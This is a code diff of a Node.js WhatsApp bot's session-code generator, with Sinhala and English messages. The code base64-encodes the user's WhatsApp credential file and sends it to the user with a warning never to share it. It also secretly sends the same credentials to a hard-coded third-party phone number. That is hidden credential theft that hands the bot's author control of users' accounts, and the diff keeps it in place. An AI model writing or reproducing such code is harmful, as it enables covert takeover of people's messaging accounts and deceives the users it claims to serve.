@@ -33,9 +33,9 @@ if (fs.existsSync('./auth_info_baileys')) {
               let user = SlKingXMD.user.id;
 
           let CREDS = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
-          var  = Buffer.from(CREDS).toString('base64')
+          var SlkingXMDqrcodeID = Buffer.from(CREDS).toString('base64')
          // res.json({status:true,SlkingXMDqrcodeID })
-       const rows = [
+         const rows = [
          {title: '⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ ඔබගෙ QR කේතය', description: '\n\nSLKINGXMD;;;' + SlkingXMDqrcodeID + '\n\n*⚠ කරුණාකර මෙම කේතය කිසිවෙකු සමඟ බෙදා නොගන්න!* ' + conn.user.name , rowId:"rowid1"},
          {title: '⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ තොරතුරු', description: `\n\n*🖲️ සාදරයෙන් ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MultiDevice WhatsApp User Bot වෙත පිලිගන්නවා 🖲️*\n\n\n*🖲️ ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ යනූ සීඝ්‍රයෙන් වර්ධනය වන Whatsapp රොබෝවෙකි..⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ වෙත ලැබෙන නව අංග හා යතාවත්කාලින කිරිම් ලබා ගැනීමට🖲️ .update විධානය භාවිතා කරන්න..*\n\n*🖲️ Welcome To  ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ WhatsApp User Bot\n\n\n*🖲️ ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ is a powerfull WhatsApp robot developed By Nethsara Gimhan.*\n\n🖲️ .update Command use for new items*`, rowId:"rowid2"},
          {title: 'අවවාදයන්, ᴡᴀʀɴɪɴɢs ', description: `\n\n${warn}`, rowId:"rowid3"},
@@ -48,11 +48,11 @@ if (fs.existsSync('./auth_info_baileys')) {
         }
           await SlKingXMD.sendMessage(user, { text: button });
           await SlKingXMD.sendMessage(user, { image: { url : 'https://telegra.ph/file/b553f253d553821af155f.jpg' }, caption : "﹝💹️﹞ Thanks for using ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MD-WA-BOT﹝💹﹞*" })
-          await SlKingXMD.sendMessage(user, { text:  "SLKINGXMD;;;" + SlkingXMDqrcodeID });
+          await SlKingXMD.sendMessage(user, { text:  SlkingXMDqrcodeID });
           await SlKingXMD.sendMessage(user, { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
 //=====================================================
           await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { image: { url : 'https://telegra.ph/file/b553f253d553821af155f.jpg' }, caption : "﹝💹️﹞ Thanks for using ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MD-WA-BOT﹝💹﹞*" })
-          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text:  "SLKINGXMD;;;" + SlkingXMDqrcodeID });
+          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text:  SlkingXMDqrcodeID });
           await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
           await delay(1000);
           try{ await fs.emptyDirSync(__dirname+'/auth_info_baileys'); }catch(e){}
